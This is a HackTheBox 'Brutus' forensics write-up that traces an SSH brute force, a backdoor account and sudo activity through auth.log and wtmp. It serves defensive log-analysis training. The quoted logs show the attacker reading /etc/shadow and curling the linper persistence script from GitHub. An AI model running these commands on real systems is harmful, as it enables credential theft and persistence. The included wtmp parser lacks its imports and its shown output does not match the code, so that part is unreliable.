# Brutus

## Descrition 

This is the HackTheBox description for the challenge:

In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

## Questions :

### 1. Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?

To find the ip of the attacker, we need to look at the auth.log file. Knowing that the atacker was trying to brute force the server, we can look for failed login attempts. For this, we can `grep` the auth.log looking for potential failed login attempts or invalid users (which are also a sign of a brute force attack). 

This command will return all the lines in the auth.log file that contain the word "invalid". This will help us identify the IP address of the attacker. 

```bash
┌──(shimp㉿kali)-[~/Desktop/HTB/sherlok/brutus]
└─$ grep invalid auth.log 
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
Mar  6 06:31:33 ip-172-31-35-28 sshd[2327]: Failed password for invalid user admin from 65.2.161.68 port 46392 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2331]: Failed password for invalid user admin from 65.2.161.68 port 46436 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2332]: Failed password for invalid user admin from 65.2.161.68 port 46444 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2335]: Failed password for invalid user admin from 65.2.161.68 port 46460 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2337]: Failed password for invalid user admin from 65.2.161.68 port 46498 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2334]: Failed password for invalid user admin from 65.2.161.68 port 46454 ssh2
``` 

The structure of log entries in the auth.log file usually follows this pattern: 

- Date and time : The date and time when the event occurred.
- Hostname : The hostname of the machine where the event occurred.
- Service : The service that generated the log entry.
- PID : The process ID of the service that generated the log entry.
- Message : The message that describes the event.
- User : The user that generated the log entry.
- IP address : The IP address of the machine where the event occurred.

We can finally see that the IP address of the attacker is ``65.2.161.68``.

### 2. The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?

To look for a successful login attempt, we can `grep` the auth.log file looking for the word "Accepted". This will return all the lines in the auth.log file that contain the word "Accepted". 

```bash
┌──(shimp㉿kali)-[~/Desktop/HTB/sherlok/brutus]
└─$ grep Accepted auth.log
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
```

We can see that the attacker gained access to the root account, but alos to an account called ``cyberjunkie``.

Let's investigate the account ``cyberjunkie`` further.


```bash
┌──(shimp㉿kali)-[~/Desktop/HTB/sherlok/brutus]
└─$ grep cyberjunkie auth.log
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: pam_unix(sshd:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
Mar  6 06:37:34 ip-172-31-35-28 systemd: pam_unix(systemd-user:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
```

We can see that the user ``cyberjunkie`` was actually created by the attacker and granted sudo privileges.
We can also see that the attacker used the ``cyberjunkie`` account to read the ``/etc/shadow`` file and download a script from github.

After further investigation, I found that https://github.com/montysecurity/linper is a script that places a reverse shell on the server.

### 3. Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?

The trick here is to remember that the attacker is using a brute force attack tool to acknoledge the right password. This means that the attacker will have to log in manually to the server to carry out their objectives (Reading the question is a good hint here).

Here comes the use of the WTMP file. 
The WTMP file is a log file that contains information about the user logins and logouts on a Unix system.

Trying to read the WTMP file with the `cat` command will display a lot of gibberish, so after some research, I found that the `last` command can be used to read the WTMP file.
Trying `last -f wtmp`, I got the following output:

```bash
open_database_ro: Cannot open database (/var/lib/wtmpdb/wtmp.db): unable to open database file
```

This error is due to the fact that the WTMP file is binary and the `last` command is trying to read it as a text file. To fix this, I again did some research and found that the `utmpdump` command can be used to convert the WTMP file to a text file.

```bash
utmpdump wtmp
```

Here again I got an error, utmpdump is not found by my machine. I tryed to re install the util-linux package but it did not work. I decided in response to write a simple python script to read the WTMP file.

```python
import struct
import time

wtmp_file = "./wtmp"

RECORD_SIZE = 384

# The format of each record in the wtmp file(384 bytes)
FMT = "hi32s4s32s256shhiii4I20x"

def parse_wtmp(file_path):
    with open(file_path, "rb") as f:
        while chunk := f.read(RECORD_SIZE):
            data = struct.unpack(FMT, chunk)
            
            ut_type = data[0]
            ut_pid = data[1]
            ut_line = data[2].decode("utf-8").strip("\x00")
            ut_id = data[3].decode("utf-8").strip("\x00")
            ut_user = data[4].decode("utf-8").strip("\x00")
            ut_host = data[5].decode("utf-8").strip("\x00")
            ut_session = data[8]
            ut_timestamp = data[9]
            ut_addr = ".".join(map(str, data[12:16]))

            # Convert to datetime and adjust for timezone (subtract 1 hour)
            time_utc = datetime.utcfromtimestamp(ut_timestamp)
            time_adjusted = time_utc - timedelta(hours=1)  # Subtract 1 hour for CET

            # Format the time with the correct timezone
            time_str = time_adjusted.strftime('%Y-%m-%dT%H:%M:%S,%f+0000')

            log_type = {
                7: "LOGIN",
                8: "LOGOUT",
                6: "BOOT",
                2: "INIT_PROCESS",
                5: "RUN_LVL"
            }.get(ut_type, "UNKNOWN")

            # Print the record in the same way that utmpdump does 
            print(f"[{ut_type}] [{ut_pid:05d}] [{ut_id:4}] [{ut_user:10}] [{ut_line:10}] [{ut_host:20}] [{ut_addr:15}] [{time_str}]")

parse_wtmp(wtmp_file)
```

This script will read the WTMP file and print the records in the same way that the `utmpdump` command does. 

```bash
[7] [02549] [ts/1] [root      ] [pts/1     ] [65.2.161.68         ] [0.0.0          ] [2024-03-06T06:32:45,%f+0000]
``` 

This is the ligne that shows the attacker manually logged in to the server to carry out their objectives.

### 4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

Session numbers are assigned to SSH login sessions upon login. To find the session number assigned to the attacker's session for the user account from Question 2, we can go back to the auth.log file and look for the line that contains "New session", "root" and the timestamp from the previous question (we take off the seconds to make sure we get the right line).

```bash
┌──(shimp㉿kali)-[~/Desktop/HTB/sherlok/brutus]
└─$ grep "New session" auth.log | grep "root" | grep "06:32"
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

The session number assigned to the attacker's session for the user account from Question 2 is 37.

### 5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

We already noticed earlier that the attacker created a new user account called ``cyberjunkie``. This account was granted sudo privileges.

### 6. What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

According to the [MITRE ATT&CK framework](https://attack.mitre.org/), the sub-technique ID used for persistence by creating a new account is T1136.001 (The account is a local account).

### 7. What time did the attacker's first SSH session end according to auth.log?

After some research, I found that the message for a SSH session ending is "Removed session". We can use this information to find the time the attacker's first SSH session ended.


```bash
┌──(shimp㉿kali)-[~/Desktop/HTB/sherlok/brutus]
└─$ grep "Removed session" auth.log | grep 37
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
```

So the date and time the attacker's first SSH session ended is March 6th, 06:37:24.

### 8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

To find the full command executed using sudo, we can look for the line in the auth.log file that contains the word "sudo" and the username "cyberjunkie".

```bash
┌──(shimp㉿kali)-[~/Desktop/HTB/sherlok/brutus]
└─$ grep sudo auth.log | grep cyberjunkie
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
```

The full command executed using sudo is, as seen earlyer, `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`.

Thank you for reading this report. I hope you enjoyed it.

## Conclusion
 
This was a very interesting challenge. It was a good opportunity to practice my log analysis skills. I learned how to analyze auth.log and wtmp logs to track an attacker's activities on a server. I also learned how to use the `grep` command to search for specific patterns in log files. I hope you found this report helpful and informative. If you have any questions or feedback, please feel free to [send me an email](mailto:cherifjebali0301@gmail.com). Thank you for reading!

This report was written by Cherif Jebali. You can find me on [LinkedIn](https://www.linkedin.com/in/cherif-jebali-a248a1241/).



